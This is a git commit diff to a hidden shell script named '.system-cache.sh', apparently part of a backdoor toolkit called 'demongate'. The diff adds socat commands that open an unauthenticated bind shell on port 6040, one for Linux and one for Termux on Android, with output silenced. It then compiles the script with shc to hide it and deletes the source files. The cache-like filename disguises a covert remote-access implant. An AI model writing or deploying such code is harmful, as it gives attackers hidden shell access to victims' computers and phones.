29c8410a00f7e30e684730bc3da817d861acf1b9
Anonymous-CyberLegion <my.cyber.life.0@gmail.com>
2024-11-30 14:07:14 +0530

    Update .system-cache.sh

--- .system-cache.sh
+++ .system-cache.sh
@@ -5,14 +5,17 @@ if [[ '$1' == 'stop' ]]; then
 pkill socat
 pkill ssh
 elif [[ '$1' == 'k' ]]; then
-socat TCP-LISTEN:6040 EXEC:/bin/bash > /dev/null 2>1 &                     >
-socat TCP-LISTEN:6040 EXEC:/data/data/com.termux/files/usr/bin/bash > /dev/>
+socat TCP-LISTEN:6040 EXEC:/bin/bash > /dev/null 2>&1 &
+elif [[ '$1' == 't' ]]; then
+socat TCP-LISTEN:6040 EXEC:/data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &
 else
 ####################################################
 fi
-" >> demongate.sh                                                           #compilimg file
+" >> demongate.sh
+#compilimg file
 shc -f demongate.sh > /dev/null 2>1
 #deleting old files
+sleep 3
 rm demongate.sh.x.c
 rm demongate.sh
 #installing files based on specified type
